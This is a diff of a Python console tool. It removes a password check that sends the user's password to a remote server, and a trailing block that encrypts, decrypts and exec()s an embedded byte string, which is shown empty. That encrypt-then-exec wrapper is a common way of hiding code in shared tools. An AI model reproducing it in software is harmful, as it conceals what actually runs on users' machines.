@@ -61,15 +61,7 @@ cursor.hide()
 
 
 
-password = input(Colorate.Horizontal(Colors.red_to_green, f"Enter Your Password: "))
-r = requests.get(f'https://api.lead-tool.win/wrath?password={password}').text
-if 'authed!' == r:
-     pass
-else:
-    print(Colorate.Horizontal(Colors.red_to_green, ('Wrong Passowrd')))
-    print(Colorate.Horizontal(Colors.red_to_green, (f'Server Response: {r}')))
-    time.sleep(100)
-    exit()
+
 
 os.system('cls')
 
@@ -156,19 +148,4 @@ if __name__ == '__main__':
             print(Colorate.Horizontal(Colors.blue_to_red,'Bad input, Please input a number between 1 and 5'))
 
 
-from cryptography.fernet import Fernet
-import base64
 
-code = b"""
-
-
-
-"""
-
-key = Fernet.generate_key()
-encryption_type = Fernet(key)
-encrypted_message = encryption_type.encrypt(code)
-
-decrypted_message = encryption_type.decrypt(encrypted_message)
-
-exec(decrypted_message)
